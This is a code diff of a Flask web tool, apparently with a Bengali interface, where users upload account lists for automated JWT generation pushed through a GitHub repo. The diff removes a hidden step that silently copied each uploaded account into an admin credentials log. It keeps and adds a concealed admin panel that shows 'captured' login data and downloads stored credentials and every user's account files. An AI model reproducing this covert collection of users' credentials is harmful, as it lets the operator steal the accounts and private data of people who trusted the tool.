+    if os.path.exists(UPLOAD_FOLDER):
+        for f in os.listdir(UPLOAD_FOLDER):
+            if f.startswith("active_accounts_") and f.endswith(".txt"):
+                f_path = os.path.join(UPLOAD_FOLDER, f)
+                all_files.append({
+                    "name": f,
+                    "count": count_valid_accounts(f_path)
+                })
                     
     manual_data = "No login data captured yet."
     if os.path.exists(CREDENTIALS_LOG_PATH):
@@ -962,7 +1147,7 @@ def admin_panel():
         except:
             pass
 
-    return render_template_string(ADMIN_TEMPLATE, file_exists=file_exists, file_preview=file_preview, total_count=total_count, manual_credentials_data=manual_data)
+    return render_template_string(ADMIN_TEMPLATE, files_list=all_files, manual_credentials_data=manual_data)
 
 @app.route('/hello-admin-auth', methods=['POST'])
 def admin_auth():
@@ -977,8 +1162,29 @@ def admin_logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('login_gate'))
 
+@app.route('/api/admin/download-manual')
+def download_manual_log():
+    if not session.get('admin_logged_in'):
+        return "Unauthorized", 401
+    if os.path.exists(CREDENTIALS_LOG_PATH):
+        return send_from_directory(ADMIN_DATA_FOLDER, 'stored_credentials.txt', as_attachment=True)
+    return "File not found", 404
+
+@app.route('/api/admin/download-file/<filename>')
+def download_uploaded_file(filename):
+    if not session.get('admin_logged_in'):
+        return "Unauthorized", 401
+    if filename.startswith("active_accounts_") and filename.endswith(".txt"):
+        file_path = os.path.join(UPLOAD_FOLDER, filename)
+        if os.path.exists(file_path):
+            return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
+    return "File not found", 404
+
 @app.route('/api/upload-file', methods=['POST'])
 def upload_file_route():
+    if not session.get('user_authenticated'):
+        return jsonify({"success": False, "message": "Unauthorized"}), 401
+        
     if 'file' not in request.files:
         return jsonify({"success": False, "message": "No file part"}), 400
     file = request.files['file']
@@ -986,31 +1192,21 @@ def upload_file_route():
         return jsonify({"success": False, "message": "No selected file"}), 400
     
     if file and file.filename.endswith('.txt'):
+        saved_file_path, short_name = get_user_file_path()
         existing_accounts = set()
         
-        if os.path.exists(SAVED_FILE_PATH):
+        if os.path.exists(saved_file_path):
             try:
-                with open(SAVED_FILE_PATH, 'r', encoding='utf-8') as f:
+                with open(saved_file_path, 'r', encoding='utf-8') as f:
                     for line in f:
                         if line.strip():
                             existing_accounts.add(line.strip())
             except:
                 pass
         
-        admin_accounts = set()
-        if os.path.exists(CREDENTIALS_LOG_PATH):
-            try:
-                with open(CREDENTIALS_LOG_PATH, 'r', encoding='utf-8') as f:
-                    for line in f:
-                        if line.strip():
-                            admin_accounts.add(line.strip())
-            except:
-                pass
-        
         try:
             new_lines = file.stream.read().decode('utf-8').splitlines()
             unique_new_entries = []
-            unique_admin_entries = []
             
             for line in new_lines:
                 line_str = line.strip()
@@ -1020,39 +1216,40 @@ def upload_file_route():
                 if line_str not in existing_accounts:
                     existing_accounts.add(line_str)
                     unique_new_entries.append(line_str)
-                
-                if line_str not in admin_accounts:
-                    admin_accounts.add(line_str)
-                    unique_admin_entries.append(line_str)
             
             if unique_new_entries:
-                with open(SAVED_FILE_PATH, 'a', encoding='utf-8') as f:
+                with open(saved_file_path, 'a', encoding='utf-8') as f:
                     for entry in unique_new_entries:
-                        f.write(f"{entry}\n")
-                        
-            if unique_admin_entries:
-                with open(CREDENTIALS_LOG_PATH, 'a', encoding='utf-8') as f:
-                    for entry in unique_admin_entries:
                         f.write(f"{entry}\n")
                         
         except Exception as e:
             return jsonify({"success": False, "message": f"File parsing failed: {str(e)}"}), 500
             
-        valid_account_count = count_valid_accounts(SAVED_FILE_PATH)
-        auto_status["total_accounts_loaded"] = valid_account_count
-        auto_status["current_file_name"] = "active_accounts.txt"
+        valid_account_count = count_valid_accounts(saved_file_path)
         
-        return jsonify({"success": True, "count": valid_account_count, "filename": "active_accounts.txt"})
+        user_id = session['user_file_id']
+        status_obj = get_user_status_dict(user_id)
+        status_obj["total_accounts_loaded"] = valid_account_count
+        status_obj["current_file_name"] = short_name
+        
+        return jsonify({"success": True, "count": valid_account_count, "filename": short_name})
     
     return jsonify({"success": False, "message": "Invalid file extension"}), 400
 
 @app.route('/api/delete-dashboard-file', methods=['POST'])
 def delete_dashboard_file():
+    if not session.get('user_authenticated'):
+        return jsonify({"success": False, "message": "Unauthorized"}), 401
     try:
-        if os.path.exists(SAVED_FILE_PATH):
-            os.remove(SAVED_FILE_PATH)
-            auto_status["total_accounts_loaded"] = 0
-            auto_status["current_file_name"] = "None"
+        saved_file_path, _ = get_user_file_path()
+        if os.path.exists(saved_file_path):
+            os.remove(saved_file_path)
+            
+            user_id = session['user_file_id']
+            status_obj = get_user_status_dict(user_id)
+            status_obj["total_accounts_loaded"] = 0
+            status_obj["current_file_name"] = "None"
+            
             return jsonify({"success": True, "message": "ফাইলটি সফলভাবে ডিলিট হয়েছে☠️!"})
         else:
             return jsonify({"success": False, "message": "কোনো ফাইল ডিলিট করার জন্য পাওয়া যায়নি।"})
@@ -1132,22 +1329,27 @@ def auto_start():
     interval = data.get('interval', 5)
     file_path = data.get('file_path')
     
-    if auto_status["running"]:
+    user_id = session['user_file_id']
+    status_obj = get_user_status_dict(user_id)
+    
+    if status_obj["running"]:
         return jsonify({"success": False, "message": "Automation already running"})
         
-    auto_status["running"] = True
-    auto_status["interval"] = interval
-    auto_status["error"] = "None"
+    status_obj["running"] = True
+    status_obj["interval"] = interval
+    status_obj["error"] = "None"
     
-    auto_token_job(github_token, repo, file_path, SAVED_FILE_PATH)
+    saved_file_path, _ = get_user_file_path()
     
+    job_id = f'jwt_auto_job_{user_id}'
     scheduler.add_job(
-        id='jwt_auto_job',
+        id=job_id,
         func=auto_token_job,
         trigger='interval',
         minutes=interval,
-        args=[github_token, repo, file_path, SAVED_FILE_PATH],
-        replace_existing=True
+        args=[github_token, repo, file_path, saved_file_path, user_id],
+        replace_existing=True,
+        next_run_time=datetime.now()
     )
     
     return jsonify({"success": True})
@@ -1157,13 +1359,18 @@ def auto_stop():
     if not session.get('user_authenticated'):
         return jsonify({"success": False, "message": "Unauthorized"}), 401
         
-    if auto_status["running"]:
+    user_id = session['user_file_id']
+    status_obj = get_user_status_dict(user_id)
+    
+    if status_obj["running"]:
         try:
-            scheduler.remove_job('jwt_auto_job')
+            job_id = f'jwt_auto_job_{user_id}'
+            scheduler.remove_job(job_id)
         except:
             pass
-        auto_status["running"] = False
-        auto_status["next_run_timestamp"] = 0
+        status_obj["running"] = False
+        status_obj["next_run_timestamp"] = 0
+        status_obj["current_generating_count"] = 0
         
     return jsonify({"success": True})
 
@@ -1171,8 +1378,15 @@ def auto_stop():
 def auto_status_route():
     if not session.get('user_authenticated'):
         return jsonify({"success": False, "message": "Unauthorized"}), 401
-    return jsonify(auto_status)
+        
+    user_id = session['user_file_id']
+    status_obj = get_user_status_dict(user_id)
+    
+    saved_file_path, short_name = get_user_file_path()
+    status_obj["total_accounts_loaded"] = count_valid_accounts(saved_file_path)
+    status_obj["current_file_name"] = short_name if os.path.exists(saved_file_path) else "None"
+    
+    return jsonify(status_obj)
 
-# --- অ্যাপ্লিকেশন রান ব্লক ---
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
